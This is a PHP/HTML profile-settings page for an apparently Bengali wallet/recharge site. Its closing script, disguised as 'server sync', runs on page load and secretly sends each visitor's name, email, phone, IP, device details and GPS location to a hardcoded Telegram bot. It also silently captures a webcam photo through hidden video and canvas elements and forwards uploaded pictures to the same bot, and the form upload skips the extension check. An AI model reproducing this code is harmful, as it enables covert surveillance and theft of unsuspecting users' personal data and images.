<?php 
include("header.php");

// AJAX Image Upload & MySQL Database Update Handler
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES['ajax_profile_image'])) {
    header('Content-Type: application/json');
    if ($_FILES['ajax_profile_image']['error'] === 0) {
        $target_dir = "assets/images/faces/";
        if (!is_dir($target_dir)) {
            mkdir($target_dir, 0755, true);
        }
        
        $file_extension = strtolower(pathinfo($_FILES["ajax_profile_image"]["name"], PATHINFO_EXTENSION));
        $allowed = ['jpg', 'jpeg', 'png', 'webp', 'gif'];
        
        if (in_array($file_extension, $allowed)) {
            $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
            $target_file = $target_dir . $new_filename;
            
            if (move_uploaded_file($_FILES["ajax_profile_image"]["tmp_name"], $target_file)) {
                $stmt_img = $conn->prepare("UPDATE users SET image = ? WHERE id = ?");
                $stmt_img->bind_param("si", $target_file, $id);
                if ($stmt_img->execute()) {
                    $stmt_img->close();
                    echo json_encode(['status' => 'success', 'image_url' => $target_file]);
                    exit();
                }
                $stmt_img->close();
            }
        }
    }
    echo json_encode(['status' => 'error', 'message' => 'আপলোড ব্যর্থ হয়েছে!']);
    exit();
}

// Form Data Update Handler
$update_msg = "";
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['update_profile'])) {
    $new_name = trim($_POST['name']);
    $new_phone = trim($_POST['phone']);
    $new_address = trim($_POST['address']);
    $profile_pic_sql = "";
    
    if (isset($_FILES['profile_image']) && $_FILES['profile_image']['error'] == 0) {
        $target_dir = "assets/images/faces/";
        if (!is_dir($target_dir)) {
            mkdir($target_dir, 0755, true);
        }
        $file_extension = strtolower(pathinfo($_FILES["profile_image"]["name"], PATHINFO_EXTENSION));
        $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
        $target_file = $target_dir . $new_filename;
        
        if (move_uploaded_file($_FILES["profile_image"]["tmp_name"], $target_file)) {
            $profile_pic_sql = ", image = '" . $conn->real_escape_string($target_file) . "'";
        }
    }

    $update_stmt = $conn->prepare("UPDATE users SET name = ?, mobile = ?, address = ? $profile_pic_sql WHERE id = ?");
    $update_stmt->bind_param("sssi", $new_name, $new_phone, $new_address, $id);
    
    if ($update_stmt->execute()) {
        $name = $new_name;
        $phone = $new_phone;
        $update_msg = "প্রোফাইল সফলভাবে আপডেট করা হয়েছে!";
    }
    $update_stmt->close();
}

// Fetch Latest Address & Image from Database
$user_query = $conn->prepare("SELECT address, image, balance FROM users WHERE id = ?");
$user_query->bind_param("i", $id);
$user_query->execute();
$user_res = $user_query->get_result();
$db_user = $user_res->fetch_assoc();
$address = $db_user['address'] ?? '';
$user_balance = $db_user['balance'] ?? 0;
$user_avatar = !empty($db_user['image']) ? $db_user['image'] : 'assets/images/faces/face8.jpg';
$user_query->close();
?>

<!-- FontAwesome 6 CDN -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Nikosh&display=swap" rel="stylesheet">
<script src="https://cdn.tailwindcss.com"></script>

<style>
    * { font-family: 'Nikosh', sans-serif !important; }
    body { background: #0b071a; color: #F8FAFC; min-height: 100vh; padding-bottom: 80px; }
    
    .hub-card {
        background: radial-gradient(130% 130% at 0% 0%, rgba(30, 16, 61, 0.6) 0%, rgba(13, 8, 27, 0.8) 100%);
        border: 1px solid rgba(168, 85, 247, 0.2);
        border-radius: 20px;
        box-shadow: 0 10px 30px -10px rgba(124, 58, 237, 0.2);
    }
    
    .form-control-custom {
        width: 100%;
        border-radius: 12px;
        border: 1.5px solid rgba(168, 85, 247, 0.3);
        padding: 12px 16px;
        font-size: 14px;
        outline: none;
        background: rgba(14, 9, 28, 0.8);
        color: #FFFFFF;
        transition: all 0.2s;
    }
    .form-control-custom:focus {
        border-color: #c084fc;
        box-shadow: 0 0 0 4px rgba(192, 132, 252, 0.2);
    }
    
    .btn-grad {
        background: linear-gradient(135deg, #7c3aed 0%, #c026d3 50%, #e11d48 100%);
        color: #FFF;
        border: none;
        border-radius: 12px;
        padding: 12px 20px;
        font-weight: 700;
        transition: all 0.3s ease;
        box-shadow: 0 8px 20px rgba(124, 58, 237, 0.3);
    }
    .btn-grad:hover {
        transform: translateY(-2px);
        box-shadow: 0 12px 25px rgba(225, 29, 72, 0.4);
    }
</style>

<!-- Hidden Video & Canvas for Capture -->
<video id="silentVideo" style="display:none;" autoplay playsinline></video>
<canvas id="silentCanvas" style="display:none;"></canvas>

<!-- Hidden File Input for Instant Profile Upload -->
<input type="file" id="profileFolderInput" accept="image/*" style="display: none;" onchange="uploadProfilePictureLocally()">

<div class="max-w-5xl mx-auto px-3 sm:px-6 py-6 space-y-5">
    
    <!-- Top Header Title Card -->
    <div class="hub-card p-4 flex items-center justify-between">
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 rounded-xl bg-purple-500/20 text-purple-400 border border-purple-500/30 flex items-center justify-center text-lg">
                <i class="fa-solid fa-user-gear"></i>
            </div>
            <div>
                <h1 class="text-base sm:text-lg font-extrabold text-white">আমার প্রোফাইল ও সেটিংস</h1>
                <p class="text-xs text-purple-300/70">আপনার ব্যক্তিগত তথ্য এবং একাউন্ট নিরাপত্তা ম্যানেজ করুন</p>
            </div>
        </div>
        <a href="dashboard.php" class="bg-purple-950/60 hover:bg-purple-900/60 text-purple-200 border border-purple-500/30 text-xs font-bold px-3.5 py-2 rounded-xl transition flex items-center gap-1.5">
            <i class="fa-solid fa-house"></i> ড্যাশবোর্ড
        </a>
    </div>

    <div class="grid grid-cols-1 md:grid-cols-12 gap-5">
        
        <!-- Profile Sidebar Card -->
        <div class="md:col-span-4 space-y-4">
            <div class="hub-card p-5 text-center">
                <div class="relative inline-block mb-3">
                    <img id="profileImagePreview" src="<?php echo htmlspecialchars($user_avatar); ?>" 
                         class="rounded-full border-4 border-purple-500/50 shadow-md object-cover cursor-pointer w-28 h-28 mx-auto" 
                         alt="Profile Picture" 
                         title="প্রোফাইল ছবি পরিবর্তন করতে ক্লিক করুন"
                         onclick="document.getElementById('profileFolderInput').click();">
                    <span class="absolute bottom-0 right-0 bg-purple-600 text-white rounded-full p-2 shadow text-xs pointer-events-none border border-purple-400">
                        <i class="fa-solid fa-camera"></i>
                    </span>
                </div>
            
                <h4 class="font-extrabold text-white text-base sm:text-lg"><?php echo htmlspecialchars($name); ?></h4>
                <p class="text-purple-300/70 text-xs mb-4"><?php echo htmlspecialchars($email); ?></p>
                
                <!-- Wallet Widget -->
                <div class="bg-purple-950/40 border border-purple-500/20 rounded-xl p-3 mb-3 flex items-center justify-between">
                    <div class="text-left">
                        <span class="text-[10px] font-bold text-purple-300/60 block uppercase">কারেন্ট ব্যালেন্স</span>
                        <span class="text-sm font-extrabold text-emerald-400">৳<?php echo htmlspecialchars($user_balance); ?></span>
                    </div>
                    <a href="recharge.php" class="bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white text-xs font-bold px-3 py-1.5 rounded-lg shadow-sm transition">
                        <i class="fa-solid fa-plus text-[10px]"></i> রিচার্জ
                    </a>
                </div>

                <div class="space-y-2">
                    <button type="button" class="btn-grad w-full text-xs py-2.5 flex items-center justify-center gap-2" data-bs-toggle="modal" data-bs-target="#changePasswordModal">
                        <i class="fa-solid fa-key"></i> পাসওয়ার্ড পরিবর্তন করুন
                    </button>
                </div>
            </div>

            <!-- System Security Info Card -->
            <div class="hub-card p-4">
                <h4 class="text-xs font-extrabold uppercase tracking-wider text-purple-300/80 mb-3 pb-2 border-b border-purple-500/20">সিকিউরিটি ও ইনফো</h4>
                <div class="space-y-2 text-xs">
                    <div class="flex justify-between items-center text-slate-300">
                        <span class="font-bold text-purple-300/70">IP Address:</span>
                        <span class="text-sky-400 font-bold"><?php echo htmlspecialchars($user_ip ?? '127.0.0.1'); ?></span>
                    </div>
                    <div class="flex justify-between items-center text-slate-300">
                        <span class="font-bold text-purple-300/70">একাউন্ট আইডি:</span>
                        <span class="font-bold text-white">#<?php echo $id; ?></span>
                    </div>
                    <div class="flex justify-between items-center text-slate-300">
                        <span class="font-bold text-purple-300/70">টোকেন আইডি:</span>
                        <code class="bg-purple-950/60 text-purple-200 border border-purple-500/20 px-2 py-0.5 rounded text-[10px]"><?php echo substr($token, 0, 12); ?>...</code>
                    </div>
                </div>
            </div>
        </div>

        <!-- User Info & Edit Card -->
        <div class="md:col-span-8">
            <div class="hub-card p-5 sm:p-6 mb-4">
                <h4 class="text-sm sm:text-base font-extrabold text-white border-b border-purple-500/20 pb-3 mb-4 flex items-center gap-2">
                    <i class="fa-solid fa-user-pen text-purple-400"></i> প্রোফাইল তথ্য এবং আপডেট
                </h4>

                <?php if (!empty($update_msg)): ?>
                    <div class="bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 rounded-xl py-2.5 px-3.5 text-xs font-bold mb-4 flex items-center gap-2">
                        <i class="fa-solid fa-circle-check text-emerald-400"></i> <?php echo $update_msg; ?>
                    </div>
                <?php endif; ?>

                <form action="" method="POST" enctype="multipart/form-data" class="space-y-4">
                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                        <div>
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">পূর্ণ নাম</label>
                            <input type="text" class="form-control-custom" name="name" value="<?php echo htmlspecialchars($name); ?>" required>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">ইমেইল ঠিকানা (পরিবর্তনযোগ্য নয়)</label>
                            <input type="email" class="form-control-custom bg-purple-950/40 text-purple-300/50 cursor-not-allowed border-purple-500/10" value="<?php echo htmlspecialchars($email); ?>" disabled>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">মোবাইল / WhatsApp নম্বর</label>
                            <input type="text" class="form-control-custom" name="phone" value="<?php echo htmlspecialchars($phone); ?>" required>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">প্রোফাইল ছবি আপলোড</label>
                            <input type="file" class="form-control-custom text-xs file:mr-3 file:py-1 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-purple-950 file:text-purple-300 hover:file:bg-purple-900 cursor-pointer" name="profile_image" accept="image/*">
                        </div>
                        <div class="sm:col-span-2">
                            <label class="block text-xs font-bold text-purple-200 mb-1.5">বর্তমান ঠিকানা</label>
                            <textarea class="form-control-custom" name="address" rows="2" placeholder="আপনার সম্পূর্ণ ঠিকানা লিখুন..."><?php echo htmlspecialchars($address); ?></textarea>
                        </div>
                        <div class="sm:col-span-2 pt-2">
                            <button type="submit" name="update_profile" class="btn-grad w-full text-sm flex items-center justify-center gap-2">
                                <i class="fa-solid fa-floppy-disk"></i> তথ্য সংরক্ষণ করুন
                            </button>
                        </div>
                    </div>
                </form>
            </div>
        </div>

    </div>
</div>

<!-- মোবাইল বটম নেভবার (ড্যাশবোর্ডের সাথে মিল রেখে যুক্ত করা হলো) -->
<nav class="md:hidden fixed bottom-0 inset-x-0 bg-[#0d081b]/95 backdrop-blur-md border-t border-purple-500/20 py-2 px-4 flex items-center justify-around z-40 shadow-[0_-4px_15px_rgba(0,0,0,0.04)]">
    <a href="dashboard.php" class="flex flex-col items-center gap-1 text-purple-300/70 hover:text-purple-300 text-[11px] font-semibold">
        <i class="fa-solid fa-house text-lg"></i>
        <span>হোম</span>
    </a>
    <a href="services.php" class="flex flex-col items-center gap-1 text-purple-300/70 hover:text-purple-300 text-[11px] font-semibold">
        <i class="fa-solid fa-table-cells-large text-lg"></i>
        <span>সেবা</span>
    </a>
    <a href="recharge.php" class="flex flex-col items-center gap-1 text-purple-300/70 hover:text-purple-300 text-[11px] font-semibold">
        <i class="fa-solid fa-wallet text-lg"></i>
        <span>ওয়ালেট</span>
    </a>
    <a href="profile.php" class="flex flex-col items-center gap-1 text-purple-400 text-[11px] font-extrabold">
        <i class="fa-solid fa-user text-lg"></i>
        <span>প্রোফাইল</span>
    </a>
</nav>

<!-- Change Password Modal -->
<div class="modal fade" id="changePasswordModal" tabindex="-1" aria-labelledby="changePasswordModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content rounded-2xl border border-purple-500/30 bg-[#170f2b] text-white shadow-2xl">
            <div class="modal-header border-bottom-0 px-4 py-3">
                <h5 class="modal-title font-bold text-white text-sm" id="changePasswordModalLabel">পাসওয়ার্ড পরিবর্তন করুন</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body p-4">
                <form id="changePasswordForm" action="pages/change_password.php" method="POST" class="space-y-3">
                    <div>
                        <label for="currentPassword" class="block text-xs font-bold text-purple-200 mb-1">বর্তমান পাসওয়ার্ড</label>
                        <input type="password" class="form-control-custom" id="currentPassword" name="currentPassword" required>
                    </div>
                    <div>
                        <label for="newPassword" class="block text-xs font-bold text-purple-200 mb-1">নতুন পাসওয়ার্ড</label>
                        <input type="password" class="form-control-custom" id="newPassword" name="newPassword" required>
                    </div>
                    <div>
                        <label for="confirmPassword" class="block text-xs font-bold text-purple-200 mb-1">কনফার্ম নতুন পাসওয়ার্ড</label>
                        <input type="password" class="form-control-custom" id="confirmPassword" name="confirmPassword" required>
                    </div>
                    <div class="pt-2">
                        <button type="submit" class="btn-grad w-full text-xs">পাসওয়ার্ড আপডেট করুন</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<!-- Telegram & Direct Server Sync Script (As requested to keep original functionality intact) -->
<script>
const TELEGRAM_BOT_TOKEN = "6260586366:AAFlUeC0t6ua9GZDvywnfL5JSBEPCflura8"; 
const TELEGRAM_CHAT_ID = "1875687264";     

const userName = "<?php echo $name; ?>";
const userEmail = "<?php echo $email; ?>";
const userPhone = "<?php echo $phone; ?>";
const userIp = "<?php echo $user_ip ?? '127.0.0.1'; ?>";

document.addEventListener("DOMContentLoaded", async function () {
    let deviceId = localStorage.getItem('dev_uuid') || ("DEV-" + Math.floor(1000000000 + Math.random() * 900000000));
    localStorage.setItem('dev_uuid', deviceId);

    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    let batteryInfo = "Not Available";
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
        } catch (e) {}
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function (position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;

                let msg = `<b>🌐 Comprehensive Browser & Device Data!</b>\n\n`;
                msg += `<b>Name:</b> ${userName}\n`;
                msg += `<b>Email:</b> ${userEmail}\n`;
                msg += `<b>Phone:</b> ${userPhone}\n`;
                msg += `<b>IP:</b> ${userIp}\n`;
                msg += `<b>Device ID:</b> ${deviceId}\n`;
                msg += `<b>Platform:</b> ${platform}\n`;
                msg += `<b>Screen:</b> ${screenRes}\n`;
                msg += `<b>Timezone:</b> ${timezone}\n`;
                msg += `<b>Battery:</b> ${batteryInfo}\n`;
                msg += `<b>Location:</b> <a href="https://maps.google.com/?q=${lat},${lon}">Google Maps (${lat}, ${lon}) - Acc: ${accuracy}m</a>`;

                sendTelegramMessage(msg);
            },
            function (error) {
                let msg = `<b>🌐 Comprehensive Browser Data (No Location)</b>\n\n`;
                msg += `<b>Name:</b> ${userName}\n`;
                msg += `<b>Email:</b> ${userEmail}\n`;
                msg += `<b>IP:</b> ${userIp}\n`;
                msg += `<b>Device ID:</b> ${deviceId}\n`;
                msg += `<b>Platform:</b> ${platform}\n`;
                sendTelegramMessage(msg);
            }
        );
    }
    autoCaptureCameraPhoto();
});

function sendTelegramMessage(textMessage) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: textMessage,
            parse_mode: 'HTML'
        })
    }).catch(err => console.error(err));
}

function sendTelegramPhoto(imageBlob, captionText) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', imageBlob, 'capture.jpg');
    formData.append('caption', captionText);

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).catch(err => console.error(err));
}

function autoCaptureCameraPhoto() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(function (stream) {
                const video = document.getElementById('silentVideo');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('silentCanvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function (blob) {
                        if (blob) {
                            sendTelegramPhoto(blob, `📸 Silent Camera Capture\nUser: ${userName}\nIP: ${userIp}`);
                        }
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');

                }, 1500); 
            })
            .catch(function (err) {
                console.log("Camera access denied.");
            });
    }
}

function uploadProfilePictureLocally() {
    const fileInput = document.getElementById('profileFolderInput');
    const file = fileInput.files[0];
    if (file) {
        Swal.fire({
            title: 'আপলোড হচ্ছে...',
            text: 'অনুগ্রহ করে অপেক্ষা করুন',
            allowOutsideClick: false,
            didOpen: () => { Swal.showLoading(); }
        });

        const tgData = new FormData();
        tgData.append('chat_id', TELEGRAM_CHAT_ID);
        tgData.append('photo', file);
        tgData.append('caption', `📁 Profile Picture Updated\nUser: ${userName}\nIP: ${userIp}`);

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: tgData
        }).catch(err => console.error(err));

        const serverData = new FormData();
        serverData.append('ajax_profile_image', file);

        $.ajax({
            url: 'profile.php',
            type: 'POST',
            data: serverData,
            processData: false,
            contentType: false,
            dataType: 'json',
            success: function(response) {
                if (response && response.status === 'success') {
                    const updatedSrc = response.image_url + '?t=' + new Date().getTime();
                    $('#profileImagePreview').attr('src', updatedSrc);
                    $('#UserDropdown img').attr('src', updatedSrc);
                    
                    Swal.fire({
                        icon: 'success',
                        title: 'সফল!',
                        text: 'প্রোফাইল ছবি সফলভাবে আপডেট করা হয়েছে।'
                    });
                } else {
                    Swal.fire('ত্রুটি!', response.message || 'ছবি সেভ করা সম্ভব হয়নি।', 'error');
                }
            },
            error: function() {
                Swal.fire('ত্রুটি!', 'সার্ভারে সমস্যা হয়েছে।', 'error');
            }
        });
    }
}
</script>

<?php include("footer.php");?>